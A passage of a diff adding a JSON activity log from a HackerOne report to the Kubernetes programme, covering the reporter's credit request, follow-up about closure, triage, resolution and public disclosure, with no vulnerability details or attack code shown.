+      "type": "Activities::Comment",
+      "message": "No worries. Great! Please credit me as \"James Cleverley-Prance\"",
+      "automated_response": false,
+      "created_at": "2023-04-11T11:04:01.295Z",
+      "updated_at": "2023-04-11T11:04:01.295Z",
+      "actor": {
+        "username": "jpts",
+        "cleared": false,
+        "verified": false,
+        "url": "/jpts",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22554277,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @cjcullen, is there anything else you need from me to be able to close the report, now that the issue is publicly disclosed?",
+      "automated_response": false,
+      "created_at": "2023-06-28T10:11:30.754Z",
+      "updated_at": "2023-06-28T10:11:30.754Z",
+      "actor": {
+        "username": "jpts",
+        "cleared": false,
+        "verified": false,
+        "url": "/jpts",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22554410,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-28T10:26:43.611Z",
+      "updated_at": "2023-06-28T10:26:43.611Z",
+      "actor": {
+        "username": "h1_analyst_lea",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_lea",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/scchvcxrzeiwnpvoap8db2zxfegg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22554413,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jpts\n\nApologies for the delay, I have pinged the team again. You will be updated as soon as there is additional information to share. Thanks for your patience!\n\nBest,\n@h1_analyst_lea",
+      "automated_response": false,
+      "created_at": "2023-06-28T10:26:59.574Z",
+      "updated_at": "2023-06-28T10:26:59.574Z",
+      "actor": {
+        "username": "h1_analyst_lea",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_lea",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/scchvcxrzeiwnpvoap8db2zxfegg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22663336,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Nothing more to do here, now that it has been publicly disclosed. Thanks for following up!",
+      "automated_response": false,
+      "created_at": "2023-07-05T18:00:04.385Z",
+      "updated_at": "2023-07-05T18:00:04.385Z",
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "jpts",
+        "url": "/jpts"
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 22664948,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-05T19:24:49.306Z",
+      "updated_at": "2023-07-05T19:24:49.306Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "jpts",
+        "cleared": false,
+        "verified": false,
+        "url": "/jpts",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 23166589,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-08-04T19:24:50.646Z",
+      "updated_at": "2023-08-04T19:24:50.646Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
